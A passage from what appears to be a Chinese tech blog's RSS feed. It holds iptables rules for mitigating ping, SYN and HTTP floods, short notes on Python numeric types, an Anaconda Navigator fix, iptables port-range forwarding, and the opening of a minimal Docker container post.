<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> update</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables-persistent</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>手动保存当前的iptables规则：</strong></p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables-save</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/etc/iptables/rules.v4</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip6tables-save</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/etc/iptables/rules.v6</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h2>汇总命令</h2>
<p>下面是所有配置命令的完整总结：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 创建新的链ICMP_CHECK</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -N</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ICMP_CHECK</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 在ICMP_CHECK链中添加规则</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ICMP_CHECK</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icmp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --icmp-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> echo-request</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> limit</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --limit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1/s</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --limit-burst</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RETURN</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ICMP_CHECK</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icmp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --icmp-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> echo-request</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> length</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --length</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0:100</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RETURN</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ICMP_CHECK</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DROP</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 在主链中调用新的链</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> INPUT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icmp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --icmp-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> echo-request</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ICMP_CHECK</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 启用SYN cookies并永久保存设置</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "net.ipv4.tcp_syncookies = 1"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tee</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/sysctl.conf</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sysctl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 防御SYN Flood</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> INPUT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --syn</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> limit</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --limit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1/s</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --limit-burst</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> INPUT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --syn</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DROP</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 防御HTTP Flood</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> INPUT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dport</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 80</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> limit</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --limit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 25/minute</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --limit-burst</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 100</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> INPUT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dport</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 80</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DROP</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 安装iptables-persistent以保存并在启动时恢复规则</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> update</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables-persistent</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 手动保存当前的iptables规则</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables-save</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/etc/iptables/rules.v4</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip6tables-save</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/etc/iptables/rules.v6</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>检查和应用配置</h2>
<p>确保您正确配置了所有规则并且它们按照正确的顺序执行。使用以下命令检查当前的iptables规则：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -L</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>通过这些步骤，可以有效地防御Ping of Death、SYN Flood和HTTP Flood攻击，并确保规则在系统重启后仍然生效。</p>
]]></content:encoded>
    </item>
    <item>
      <title>01线性数据结构</title>
      <link>https://www.geekery.cn/note-book/Research_Develop/Python/Python%E5%85%A8%E8%83%BD%E8%AF%BE%E4%BB%B6/01%E7%BA%BF%E6%80%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.html</link>
      <guid>https://www.geekery.cn/note-book/Research_Develop/Python/Python%E5%85%A8%E8%83%BD%E8%AF%BE%E4%BB%B6/01%E7%BA%BF%E6%80%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.html</guid>
      <source url="https://www.geekery.cn/rss.xml">01线性数据结构</source>
      <description>01线性数据结构 内建常用数据类型 分类 数值型 int、float、complex、bool 序列sequence 字符串str、字节序列bytes、bytearray 列表list、元组tuple 键值对 集合set、字典dict 数值型 int、float、complex、bool都是class，1、5.0、2+3j都是对象即实例 int：pyt...</description>
      <pubDate>Mon, 06 May 2024 07:53:47 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>内建常用数据类型</h2>
<h3>分类</h3>
<ul>
<li>数值型
<ul>
<li>int、float、complex、bool</li>
</ul>
</li>
<li>序列sequence
<ul>
<li>字符串str、字节序列bytes、bytearray</li>
<li>列表list、元组tuple</li>
</ul>
</li>
<li>键值对
<ul>
<li>集合set、字典dict</li>
</ul>
</li>
</ul>
<h2>数值型</h2>
<ul>
<li>int、float、complex、bool都是class，1、5.0、2+3j都是对象即实例</li>
<li>int：python3的int就是长整型，且没有大小限制，受限于内存区域的大小</li>
<li>float：由整数部分和小数部分组成。支持十进制和科学计数法表示。C的双精度型实现</li>
<li>complex：有实数和虚数部分组成，实数和虚数部分都是浮点数，3+4.2J</li>
<li>bool：int的子类，仅有2个实例True、False对应1和0，可以和整数直接运算</li>
</ul>
<h3>类型转换</h3>
<ul>
<li>int、float、complex、bool也可以当做内建函数对数据进行类型转换</li>
<li>int(x) 返回一个整数</li>
<li>float(x) 返回一个浮点数</li>
<li>complex(x)、complex(x,y) 返回一个复数</li>
<li>bool(x) 返回布尔值，前面讲过False等价的对象</li>
</ul>
<h3>取整</h3>
<p>math模块的floor()、ceil()函数；内建函数int()、round()；运算符//</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 整除</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">3</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">//</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">5</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">//</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">7</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">//</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">3</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">//</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">5</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">//</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">7</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">//</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">7</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">//</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">7</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">//-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">7</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">//</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">7</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">//</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">))</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># int</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'int</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Anaconda-Navigator打不开的解决方法</title>
      <link>https://www.geekery.cn/note-book/Anaconda/Anaconda-Navigator%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.html</link>
      <guid>https://www.geekery.cn/note-book/Anaconda/Anaconda-Navigator%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Anaconda-Navigator打不开的解决方法</source>
      <description>Anaconda-Navigator打不开的解决方法 解决方案 使用管理员权限运行 Anaconda Prompt 升级 navigator，执行 conda update anaconda-navigator 重置 navigator，执行 anaconda-navigator --reset 升级客户端，执行conda update anacond...</description>
      <pubDate>Mon, 06 May 2024 04:11:48 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>解决方案</h2>
<ul>
<li>使用管理员权限运行 Anaconda Prompt</li>
<li>升级 <code>navigator</code>，执行 <code>conda update anaconda-navigator</code></li>
<li>重置 <code>navigator</code>，执行 <code>anaconda-navigator --reset</code></li>
<li>升级客户端，执行conda update anaconda-client</li>
<li>升级安装依赖包，执行conda update -f anaconda-client</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Iptables实现转发一片连续的端口</title>
      <link>https://www.geekery.cn/note-book/Iptables/Iptables%E5%AE%9E%E7%8E%B0%E8%BD%AC%E5%8F%91%E4%B8%80%E7%89%87%E8%BF%9E%E7%BB%AD%E7%9A%84%E7%AB%AF%E5%8F%A3.html</link>
      <guid>https://www.geekery.cn/note-book/Iptables/Iptables%E5%AE%9E%E7%8E%B0%E8%BD%AC%E5%8F%91%E4%B8%80%E7%89%87%E8%BF%9E%E7%BB%AD%E7%9A%84%E7%AB%AF%E5%8F%A3.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Iptables实现转发一片连续的端口</source>
      <description>Iptables实现转发一片连续的端口 转发命令 解释 --to 是 --to-destination 或 --to-source 的简写 新版防火墙nftables入门解释 https://blog.rachelt.one/articles/new-to-nftables-from-config-to-dnat/</description>
      <pubDate>Sat, 20 Apr 2024 13:35:26 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>转发命令</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nat</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> PREROUTING</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> xenbr0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dport</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 64000:65000</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DNAT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.16.10.10:61000-62000</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p><strong>解释</strong></p>
<p><code>--to</code> 是  <code>--to-destination</code> 或 <code>--to-source</code> 的简写</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">DNAT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> target</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> options:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> --to-destination</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [&lt;ipaddr&gt;[-&lt;ipaddr&gt;]][:port[-port[/port]]]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">                                Address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> map</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> destination</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">SNAT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> target</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> options:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> --to-source</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [&lt;ipaddr&gt;[-&lt;ipaddr&gt;]][:port[-port]]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">                                Address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> map</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> source</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>新版防火墙nftables入门解释 <a href="https://blog.rachelt.one/articles/new-to-nftables-from-config-to-dnat/" target="_blank" rel="noopener noreferrer">https://blog.rachelt.one/articles/new-to-nftables-from-config-to-dnat/</a></p>
]]></content:encoded>
    </item>
    <item>
      <title>Docker打造最小容器MiniBash</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E6%89%93%E9%80%A0%E6%9C%80%E5%B0%8F%E5%AE%B9%E5%99%A8MiniBash.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E6%89%93%E9%80%A0%E6%9C%80%E5%B0%8F%E5%AE%B9%E5%99%A8MiniBash.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker打造最小容器MiniBash</source>
      <description>Docker打造最小容器MiniBash 介绍 突发奇想，做了一个无比小的容器，仅能维持shell的正常使用，无其他功能。但是吧，它确实是小，比官方宣称的busybox都要小。 制作方法 这个最小化容器制作方法是 找到目标程序 定位动态链接库 提取所有动态连接库 封装为docker docker作为镜像导入 运行 构建 克隆单个分支 打包为docker...</description>
      <pubDate>Thu, 18 Apr 2024 10:06:36 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>介绍</h2>
<p>突发奇想，做了一个无比小的容器，仅能维持shell的正常使用，无其他功能。但是吧，它确实是小，比官方宣称的busybox都要小。</p>
<h2>制作方法</h2>
<p>这个最小化容器制作方法是</p>
<ul>
<li>找到目标程序</li>
<li>定位动态链接库</li>
<li>提取所有动态连接库</li>
<li>封装为docker</li>
<li>docker作为镜像导入</li>
</ul>
<h2>运行</h2>
